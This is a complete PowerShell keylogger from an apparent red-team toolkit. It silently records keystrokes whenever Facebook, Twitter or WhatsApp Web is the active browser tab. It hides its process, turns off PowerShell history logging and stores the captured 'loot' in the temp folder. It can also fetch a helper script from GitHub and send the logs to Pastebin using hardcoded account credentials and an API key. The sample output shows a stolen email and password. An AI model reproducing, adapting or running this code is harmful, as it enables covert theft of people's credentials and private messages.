<#
.SYNOPSIS
   Browser keyboad keystrokes capture

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Get-Process,mscore.ps1
   Optional Dependencies: Out-PasteBin.ps1
   PS cmdlet Dev version: v1.5.18
   
.DESCRIPTION
   Start recording keyboard keystrokes if target has
   facebook,twitter,whatapp in the 'active browser tab'

.NOTES
   Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.
   Multiple logfiles will be saved under target %TMP% directory with
   the names 1_[random].Facebook OR 1_[random].Twitter [extensions]

   This cmdlet starts recording keystrokes if target user has facebook
   or twitter in the 'active tab' and stops recording whenever it detects
   the exit of the social media tab. in that case it stops the key`logger
   process, renames the logfile (loot) and waits for the social media to
   be accessed again to start recording or to be told to stop recording.

   1200 milliseconds (default) is the amount of time required for key`logger
   to start execution and build pid.log file. If we chose to use less than 1
   second delay then cmdlet executes more than one instance of powershell.
   [ALL PIDs started previous, will be stoped by this cmdlet automatic]

   [SEND_TO_PASTEBIN]
   Remark: pastebin webserver only accepts 20 pastes per day! (free account)
   Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
   1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
   2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin

.Parameter Mode
   Start or Stop key`logger (default: start)

.Parameter Delay
   Milliseconds delay between loops (default: 1200)

.Parameter Force
   Switch to bypass check: Is_Browser_Active?

.Parameter Schedule
   Schedule cmdlet execution at: [HH:mm]

.Parameter SendToPasteBin
   Switch to send loot to pastebin server

.Parameter PastebinUsername
   PasteBin UserName to authenticate to

.Parameter PastebinPassword
   PasteBin Password to authenticate to

.Parameter PastebinDeveloperKey
   The pasteBin API key to authenticate with

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -mode 'start'
   Start browser key`logger capture 

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -delay '5000' -force
   Use 5 seconds between each loop + bypass: Is_Browser_Active?

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -schedule '02:34' -mode 'start'
   Schedule cmdlet capture to start at [HH:mm] hours

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -mode 'stop'
   Stop key`logger and leak keystrokes on screen 

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -mode 'stop' -sendtopastebin
   Trigger SendToPasteBin function + stop key`logger + leak keystrokes 

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -mode 'start' -PastebinUsername 'pedro_testing' -PastebinPassword 'angelapastebin' -SendToPasteBin
   Start key`logger and send logfile to pastebin everytime target user changes\exit social media browser active tab

.EXAMPLE
   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '200' -force"
   Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials

.INPUTS
   None. You cannot pipe objects into SocialMedia.ps1

.OUTPUTS
   ╰➤ [01:23] 👁‍🗨 Social media key`logger 👁‍🗨

   Social Media: Facebook
   Logfile: 1_sdfsrs.Facebook
   ----------------------------
   Annoyed_Wife@hotmailcom
   s3cr3t_bitCh_p4ss
   ----------------------------

   Social Media: Facebook
   Logfile: 2_soimui.Facebook
   ----------------------------
   hello chad, are you here? :P
   ----------------------------

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PastebinDeveloperKey='OuSFtYtUpaWKq4uVawzPuo3i-NM1c2nN',
   [string]$PastebinPassword="houdini12345",
   [string]$PastebinUsername="Meterpeter",
   [switch]$SendToPasteBin,
   [string]$Schedule="now",
   [string]$Mode="start",
   [int]$Delay='1200',
   [switch]$Force
)


Clear-Host
$CmdletVersion = "v1.5.18"
$IPath = (Get-Location).Path
$CurrentTime = (Get-Date -Format 'HH:mm')
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

$StartBanner = @"
 )\ )                    (    (             (               
(()/(          (      )  )\   )\))(     (   )\ )  (      )  
 /(_)) (    (  )\  ( /( ((_) ((_)()\   ))\ (()/(  )\  ( /(  
(_))   )\   )\((_) )(_)) _   (_()((_) /((_) ((_))(_) (_)) 
/ __| ((_) ((_)(_)((_)_ | |  |  \/  |(_))   _| |(_)((_)_  
\__ \/ _ \/ _| | |/ _  || |  | |\/| |/ -_)/ _  || |/ _  | 
|___/\___/\__| |_|\__,_||_|  |_|  |_|\___|\__,_||_|\__,_|
"@;

write-host $StartBanner -ForegroundColor DarkRed
write-host "  ♟ GitHub: https://github.com/r00t-3xp10it/redpill ♟" -ForegroundColor DarkYellow
$host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
write-host "  ╰➤ [" -ForegroundColor Green -NoNewline
write-host "$CurrentTime" -NoNewline
write-host "] 👁‍🗨 Social media key`logger 👁‍🗨" -ForegroundColor Green


## Browser names
$BrowserNames = @(
   "Chromium",
   "Firefox",
   "Chrome",
   "msedge",
   "Safari",
   "Opera"
)

$RawCmdlet = @("function Keystrokes(){
[int]`$totalNumber = 0
echo `$pid >> `$Env:TMP\pid.log ## Store Process PID to be abble to stop it later!
`$Path = `"`$Env:TMP\void.log`"
`$signatures = @'
[DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
   `$API = Add-Type -MemberDefinition `$signatures -Name 'Win32' -Namespace API -PassThru
   `$null = Ni -Path `$Path -ItemType File -Force
   try{
      While(`$true)
      {
         For(`$ascii = 9; `$ascii -le 128; `$ascii++) 
         {
            `$state = `$API::GetAsyncKeyState(`$ascii)
            If(`$state -eq -32767) 
            {
               `$null = [console]::CapsLock
               `$virtualKey = `$API::MapVirtualKey(`$ascii, 3)
               `$kbstate = New-Object Byte[] 256
               `$checkkbstate = `$API::GetKeyboardState(`$kbstate)
               `$mychar = New-Object -TypeName System.Text.StringBuilder
               `$success = `$API::ToUnicode(`$ascii, `$virtualKey, `$kbstate, `$mychar, `$mychar.Capacity, 0)
                 If(`$success) 
                 {
                    [System.IO.File]::AppendAllText(`$Path, `$mychar, [System.Text.Encoding]::Unicode)
                    `$totalNumber = `$totalNumber+1
                 }
              }
          }
       }
   }
   finally
   {
   }
}
Keystrokes")


function Invoke-KillAllPids ()
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Kill all key`logger PID's running.
   #>

   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })

   ## Kill Process PID(s)
   ForEach($KProcessId in $PPID)
   {
      ## Check if process ID its running before try to stop it.
      If([bool](Get-Process -Id "$KProcessId" -EA SilentlyContinue) -Match 'True')
      {
         ## Stop key`logger process by is PPID
         write-host "  ╰➤ ⚙️ " -ForegroundColor Green -NoNewline
         write-host "Stoping key`logger PID: " -NoNewline
         write-host "$KProcessId" -ForegroundColor Green
         Stop-Process -Id $KProcessId -Force
      }
   }
}

function Invoke-IsBrowserActive ()
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Prevent cmdlet execution if browser closed!
   #>

   $TestBrowsers = @()
   ForEach($Tokens in $BrowserNames)
   {
      ## Get names from active browsers only
      $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
      If(-not([string]::IsNullOrEmpty($Stats)))
      {
         $TestBrowsers += "$Tokens"
      }
   }

   ## Make sure we have active browser names
   If([string]::IsNullOrEmpty($TestBrowsers))
   {
      write-host "`n  📛 Error: none supported browsers found open.`n" -ForegroundColor Red
      exit ## Exit cmdlet execution (default)
   }
}

function Invoke-ScheduleStart ()
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Schedule cmdlet execution! [HH:mm]
   #>

   If($Schedule -match '^(\d+\d+:+\d+\d)$')
   {
      write-host "   ╰➤ 🕘 " -ForegroundColor Red -NoNewline
      write-host "Execution schedule to " -ForegroundColor Blue -NoNewline
      write-host "$Schedule" -NoNewline
      write-host " hours." -ForegroundColor Blue

      while($true)
      {
         ## Compare $CurrentTime with $StartTime
         $CurrentTime = (Get-Date -Format 'HH:mm')
         If($CurrentTime -match "$Schedule")
         {
            break # Continue SocialMedia cmdlet execution
         }

         ## loop each 10 seconds
         Start-Sleep -Seconds 10
      }
   }
   Else
   {
      ## Wrong schedule user input error msg
      write-host "     ╰➤ 📛 Abort: " -ForegroundColor Red -NoNewline
      write-host "wrong schedule '" -NoNewline
      write-host "$Schedule" -ForegroundColor Red -NoNewline
      write-host "' input! [exec:" -NoNewline
      write-host "now" -ForegroundColor Green -NoNewline
      write-host "]`n"
   }
}

function Invoke-SendToPasteBin ()
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - 🔥 Send loot(s) to pastebin website 🔥

   .DESCRIPTION
      Pastebin_Title_Example: Facebook_dsreds
      Remark: pastebin webserver only accepts 20 pastes per day! (free account)
      Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
      1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
      2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin
   #>

   If(-not(Test-Path -Path "$PasteThisFile" -EA SilentlyContinue))
   {
      $PasteThisFile = "$Env:TMP\void.log"
   }

   If([bool](Test-Path -Path "$Env:TMP\Out-Pastebin.ps1") -match '^(True)$')
   {
      $RandomName = -join ((97..122)|Get-Random -Count 6|%{[char]$_})
      write-host "  ╰➤ 📮 Sending loot to pastebin webserver." -ForegroundColor Blue
      write-host "`n  Paste number          : $Counter"

      If($Counter -lt 20) ## <- MAX number of pastes allowed by pastebin per day
      {
         $PasteTitle = "$SocialSite"+"_"+"$RandomName" -join ''
         write-host "  Pastebin username     : $PastebinUsername"
         write-host "  Pastebin password     : $PastebinPassword"
         write-host "  Pastebin developerKey : " -NoNewline
         write-host "$PastebinDeveloperKey" -ForegroundColor DarkYellow
         write-host "  Pastebin account Url  : " -NoNewline
         write-host "https://pastebin.com/u/$PasteBinUserName" -ForegroundColor Green
         write-host "  Send to pastebin      : $PasteThisFile"
         write-host "  Pastebin filename     : $PasteTitle`n"

         cd $Env:TMP
         $RawData = (Get-Content -Path "$PasteThisFile" -EA SilentlyContinue)
         ## Execute Out-PasteBin cmdlet in a hidden console detach from parent process [SocialMedia process pid]
         Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\Out-PasteBin.ps1 -Force;Out-Pastebin -InputObject '$RawData' -PasteTitle '$PasteTitle' -ExpiresIn 1W -Visibility Private -PastebinUsername '$PastebinUsername' -PastebinPassword '$PastebinPassword' -PastebinDeveloperKey '$PastebinDeveloperKey'"
         Start-Sleep -Seconds 5;write-host "  🎖️ Loot file deliver to pastebin server!" -ForegroundColor Blue
         Start-Sleep -Seconds 2
         cd $IPath
      }
      Else
      {
         write-host "  📛 Error: Max pastebin pastes per day reached.`n" -ForegroundColor Red      
      }
   }
}

function Invoke-CheckMediaForChange ()
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Detect [facebook<->twitter] active tab changes.
   #>

   If([bool](Test-Path -Path "$Env:TMP\Smeagol.log") -match '^(True)$')
   {
      If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
      If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
      $LastAccessed = (Get-Content -Path "$Env:TMP\Smeagol.log" -EA SilentlyContinue)

      If(-not($LastAccessed -match "^($SocialSite)$"))
      {
         write-host "  ╰➤ ⛑️ " -ForegroundColor Green -NoNewline
         write-host "move detected from " -ForegroundColor Red -NoNewline
         write-host "$LastAccessed" -ForegroundColor Green -NoNewline
         write-host " to " -ForegroundColor Red -NoNewline
         write-host "$SocialSite" -ForegroundColor Green

         ## Stop key`logger PID(s)
         If([bool](Test-Path -Path "$Env:TMP\pid.log") -match '^(True)$')
         {
            ## Kill all PID's
            Invoke-KillAllPids

            ## CleanUp -- Rename
            If([bool](Test-Path -Path "$Env:TMP\void.log") -match '^(True)$')
            {
               [int]$Counter = [int]$Counter+1
               ## Random FileName generation - rename logfile [name+extension]
               # This allows attackers to stop key`logger if target its not on social media
               $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
                     
               $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
               Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${LastAccessed}" -Force

               ## Print info onscreen
               write-host "  ╰➤ ⚙️ " -ForegroundColor Green -NoNewline
               write-host "logfile: " -NoNewline
               write-host "void.log" -ForegroundColor Yellow -NoNewline
               write-host " renamed to: " -NoNewline
               write-host "${Name}.${LastAccessed}" -ForegroundColor Yellow

               ## Send loot to pastebin
               If($SendToPasteBin.IsPresent)
               {
                  $PasteThisFile = "$Env:TMP\${Name}.${LastAccessed}"
                  Invoke-SendToPasteBin
               }

               ## CleanUP
               Remove-Item -Path "$Env:TMP\pid.log" -Force
               #Remove-Item -Path "$Env:TMP\AUTO_BACKUP.${SocialSite}" -Force
            }
         }
      }
   }

   ## CleanUp
   Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
   Remove-Item -Path "$Env:TMP\AUTO_BACKUP.${LastAccessed}" -Force
}


If($Mode -iMatch '^(start)$')
{
   [int]$Counter = 0
   $TestBrowsers = $BrowserNames
   ## Build mscore.ps1 cmdlet in %TMP%
   echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force

   ## Schedule_Cmdlet_Start?
   If(-not($Schedule -imatch '^(now)$'))
   {
      Invoke-ScheduleStart
   }

   ## Is_Browser_Active?
   If(-not($Force.IsPresent))
   {
      Invoke-IsBrowserActive
   }
   Else
   {
      ## Bypass check: Is_Browser_Active?
      write-host "   ╰➤ 🕘 Waiting for remote browser to open!" -ForegroundColor Yellow 
   }

   If($SendToPasteBin.IsPresent)
   {
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File
   }

   echo "`n"
   ## :meterpeter> requires this PID
   $pid > "$Env:TMP\met.pid"
   
   
   while($true)
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Loop funtion to capture keyboard keystrokes.
      #>

      ForEach($Item in $TestBrowsers)
      {
         ## Filter msedge process that runs in background by default
         # and dont have any 'MainWindowTitle' strings to display ( empty )
         $FilterEdge = (Get-Process -Name "$Item").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
         If(-not([string]::IsNullOrEmpty($FilterEdge)))
         {
            ## Get browser Main Window Title (active tab)
            $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com') -or ($StartKeys -Match 'web.whatsapp.com'))
            {
               ## Detect social media changes
               Invoke-CheckMediaForChange

               ## Store last access social media
               If($StartKeys -imatch 'Facebook')
               {
                  $SocialSite = "Facebook"
                  echo "$SocialSite" > $Env:TMP\Smeagol.log
               }
               If($StartKeys -imatch '/ X |twitter.com')
               {
                  $SocialSite = "Twitter"
                  echo "$SocialSite" > $Env:TMP\Smeagol.log
               }
               If($StartKeys -imatch 'web.whatsapp.com')
               {
                  $SocialSite = "Whatsapp"
                  echo "$SocialSite" > $Env:TMP\Smeagol.log
               }

               ## If pid.log does not exist = Start process
               If(-not(Test-Path -Path "$Env:TMP\pid.log"))
               {
                  ## Print info onscreen
                  write-host "  🧶 Social media '" -ForegroundColor Green -NoNewline
                  write-host "$SocialSite" -NoNewline
                  write-host "' found active.." -ForegroundColor Green
                  write-host "`n   Browser Name    : $Item"
                  write-host "   Social Media    : $SocialSite"
                  write-host "   Logfile         : " -NoNewline
                  write-host "$Env:TMP\void.log`n" -ForegroundColor Green

                  ## Execute key`logger in a hidden windows console detach from parent process
                  Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\mscore.ps1"
                  Start-Sleep -Milliseconds 1700 # Give extra time for execution
               }

               ## Key`logger running -- backup void.log logfile
               write-host "  💀 Key`logger running in background!"
               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
            }
            Else
            {
               write-host "  📛 Error: none social media found active!" -ForegroundColor Red
               If([bool](Test-Path -Path "$Env:TMP\pid.log") -match '^(True)$')
               {
                  ## Kill all PID's
                  Invoke-KillAllPids

                  If([bool](Test-Path -Path "$Env:TMP\void.log") -match '^(True)$')
                  {
                     [int]$Counter = [int]$Counter+1
                     ## Random FileName generation - rename logfile [name+extension]
                     # This allows attackers to stop key`logger if target its not on social media
                     $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
                     
                     $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
                     Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${SocialSite}" -Force

                     ## Print info onscreen
                     write-host "  ╰➤ ⚙️ " -ForegroundColor Green -NoNewline
                     write-host "logfile: " -NoNewline
                     write-host "void.log" -ForegroundColor Yellow -NoNewline
                     write-host " renamed to: " -NoNewline
                     write-host "${Name}.${SocialSite}" -ForegroundColor Yellow

                     ## Send loot to pastebin
                     If($SendToPasteBin.IsPresent)
                     {
                        $PasteThisFile = "$Env:TMP\${Name}.${SocialSite}"
                        Invoke-SendToPasteBin
                     }

                     ## CleanUP
                     Remove-Item -Path "$Env:TMP\pid.log" -Force
                     Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
                     Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
                     Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
                  }
               }
            }      
         }
      }
      ## Delay time between loops
      Start-Sleep -Milliseconds $Delay
   }
}


If($Mode -iMatch '^(stop)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Stop key`logger process (PID) and leak captures

   .NOTES
      Parameter SendToPasteBin is used in this function to
      give time for Out-Pastebin cmdlet to finish is work!
      PS C:\> .\SocialMedia.ps1 -mode 'stop' -sendtopastebin
   #>

   ## SendToPasteBin function
   If($SendToPasteBin.IsPresent)
   {
      $UriList = @(
         "https://elgoog.im/pacman",
         "https://elgoog.im/terminal",
         "https://elgoog.im/space-invaders"
      )

      ## ⛑️ Open new tab to invoke SendToPasteBin
      cmd /R start /max $(Get-Random -InputObject $UriList)
      Start-Sleep -Seconds 5
   }

   ## Kill all PID's
   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
   If(-not([string]::IsNullOrEmpty($PPID)))
   {
      Invoke-KillAllPids
   }

   ## Print info onscreen [header]
   $System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption
   $OSversion = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
   $NameDomain = (Get-CimInstance -ClassName CIM_OperatingSystem).CSName
   write-host "`n`n     Domain name      : $NameDomain"
   write-host "     OS version       : $OSversion"
   write-host "     Operative system : $System"


   write-host "`n"
   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'AUTO_BACKUP.'
   If(-not([string]::IsNullOrEmpty($GetLogNames)))
   {
      ForEach($PreventDuplicate in $GetLogNames)
      {
         <#
         .SYNOPSIS
            Author: @r00t-3xp10it
            Helper - Prevent Duplicate Logfiles [AUTO_BACKUP]
         #>
         
         $MbACKuPfILE = (dir $Env:TMP).Name|findstr /C:'AUTO_BACKUP.'
         if(-not($PreventDuplicate -match '^(AUTO_BACKUP.)'))
         {
            ## Compare all logs with AUTO_BACKUP. logfile
            $diogene = (Get-Content "$Env:TMP\${MbACKuPfILE}")
            $viriato = (Get-Content "$Env:TMP\${PreventDuplicate}")  
            If("$viriato" -match "$diogene")
            {
               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter'|findstr /V 'AUTO_BACKUP.'
               break ## Break loop after found two duplicated files = delete AUTO_BACKUP. from [output] table
            }
         }
      }

      ForEach($ReportFile in $GetLogNames)
      {
         <#
         .SYNOPSIS
            Author: @r00t-3xp10it
            Helper - [output] Leak captures OnScreen
         #>      
      
         ## Get social media names from extension
         $SocialSite = ($ReportFile).split('.')[1]
         write-host "`nSocial Media: $SocialSite"      
         write-host "Logfile: $ReportFile"
         write-host "----------------------------"
         Get-Content -Path "$Env:TMP\${ReportFile}" -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\${ReportFile}" -Force
         write-host "----------------------------`n"   
      }

      ## CleanUP
      Remove-Item -Path "$Env:TMP\*.log" -Force
      Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
   }
   Else
   {
      write-host "`n  📛 Error: none key`logger logfiles found!`n" -ForegroundColor Red
   }
}


## CleanUP
Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
exit